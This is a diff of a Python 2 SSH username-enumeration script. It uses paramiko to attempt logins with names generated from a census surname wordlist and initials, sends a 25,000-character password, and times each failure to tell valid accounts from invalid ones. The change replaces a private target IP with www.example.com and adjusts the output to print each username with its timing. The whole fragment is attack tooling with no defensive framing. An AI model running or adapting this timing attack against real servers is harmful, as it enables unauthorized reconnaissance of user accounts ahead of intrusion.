@@ -19,8 +19,7 @@ import time
 import string
 
 file='wordlists/US-census2000-lastnames-top-100.txt'
-#host='www.example.com'
-host='10.99.99.124'
+host='www.example.com'
 password='A'*25000
 port=22
 
@@ -34,13 +33,16 @@ guessinitial=1
 initials="jmrdcaslbetkgpwhnfvioy"
 
 def sshconnect(host, user, port, password):
+  sys.stdout.write(user+": ")
+  sys.stdout.flush()
   starttime=time.time()
   ssh = paramiko.SSHClient()
   ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
   try:
     ssh.connect(host, username=user, port=port, password=password)
   except:
-    print round(time.time()-starttime,2), user
+    #print round(time.time()-starttime,2), user
+    print round(time.time()-starttime,2)
 
 if (not os.path.isfile(file)):
   print "File does not exist:", file
